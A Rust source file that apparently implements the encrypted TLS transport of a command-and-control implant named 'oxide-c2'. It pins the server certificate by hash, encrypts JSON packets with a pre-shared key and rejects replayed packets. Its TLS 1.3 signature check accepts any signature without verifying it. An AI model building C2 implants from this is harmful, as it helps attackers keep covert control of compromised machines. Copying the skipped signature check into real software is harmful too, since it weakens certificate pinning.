use anyhow::{Result, Context};
use oxide_shared::{crypto::CryptoContext, packet::Packet};
use rustls::pki_types::{CertificateDer, ServerName};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;

use crate::config::Config;

pub struct TlsTransport {
    reader: tokio::io::ReadHalf<tokio_rustls::client::TlsStream<TcpStream>>,
    writer: tokio::io::WriteHalf<tokio_rustls::client::TlsStream<TcpStream>>,
    crypto: CryptoContext,
    send_seq: u64,
    last_recv_seq: Option<u64>,
}

impl TlsTransport {
    pub async fn connect(config: &Config) -> Result<Self> {
        let tcp = TcpStream::connect((&*config.host, config.port))
            .await
            .context("TCP connect failed")?;

        let verifier = Arc::new(PinnedCertVerifier {
            expected_hash: config.cert_hash,
        });

        let tls_config = rustls::ClientConfig::builder_with_protocol_versions(
            &[&rustls::version::TLS13],
        )
        .dangerous()
        .with_custom_certificate_verifier(verifier)
        .with_no_client_auth();

        let connector = TlsConnector::from(Arc::new(tls_config));
        let domain = ServerName::try_from("oxide-c2")
            .unwrap()
            .to_owned();
        let tls_stream = connector.connect(domain, tcp)
            .await
            .context("TLS handshake failed")?;

        let (reader, writer) = tokio::io::split(tls_stream);
        let crypto = CryptoContext::new(&config.psk, &config.salt, true);

        Ok(Self {
            reader,
            writer,
            crypto,
            send_seq: 0,
            last_recv_seq: None,
        })
    }

    pub async fn send(&mut self, mut packet: Packet) -> Result<()> {
        packet.seq = self.send_seq;
        self.send_seq += 1;
        let json = serde_json::to_vec(&packet)?;
        let encrypted = self.crypto.encrypt(&json);
        let len = encrypted.len() as u32;
        if len > oxide_shared::constants::MAX_MESSAGE_SIZE {
            anyhow::bail!("message too large");
        }
        self.writer.write_all(&len.to_le_bytes()).await?;
        self.writer.write_all(&encrypted).await?;
        self.writer.flush().await?;
        Ok(())
    }

    pub async fn receive(&mut self) -> Result<Packet> {
        let mut len_buf = [0u8; 4];
        self.reader.read_exact(&mut len_buf).await?;
        let len = u32::from_le_bytes(len_buf);
        if len > oxide_shared::constants::MAX_MESSAGE_SIZE {
            anyhow::bail!("message too large: {len}");
        }
        let mut buf = vec![0u8; len as usize];
        self.reader.read_exact(&mut buf).await?;
        let json = self.crypto.decrypt(&buf)
            .map_err(|e| anyhow::anyhow!("decrypt: {e}"))?;
        let packet: Packet = serde_json::from_slice(&json)?;
        if let Some(last) = self.last_recv_seq {
            if packet.seq <= last {
                anyhow::bail!("sequence number replay");
            }
        }
        self.last_recv_seq = Some(packet.seq);
        Ok(packet)
    }
}

#[derive(Debug)]
pub(crate) struct PinnedCertVerifier {
    pub expected_hash: [u8; 32],
}

impl rustls::client::danger::ServerCertVerifier for PinnedCertVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        use sha2::{Sha256, Digest};
        let hash = Sha256::digest(end_entity.as_ref());
        if hash.as_slice() == self.expected_hash {
            Ok(rustls::client::danger::ServerCertVerified::assertion())
        } else {
            Err(rustls::Error::InvalidCertificate(
                rustls::CertificateError::ApplicationVerificationFailure,
            ))
        }
    }

    fn verify_tls12_signature(
        &self, _: &[u8], _: &CertificateDer<'_>, _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Err(rustls::Error::PeerIncompatible(
            rustls::PeerIncompatible::Tls12NotOffered,
        ))
    }

    fn verify_tls13_signature(
        &self, _: &[u8], _: &CertificateDer<'_>, _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ED25519,
        ]
    }
}
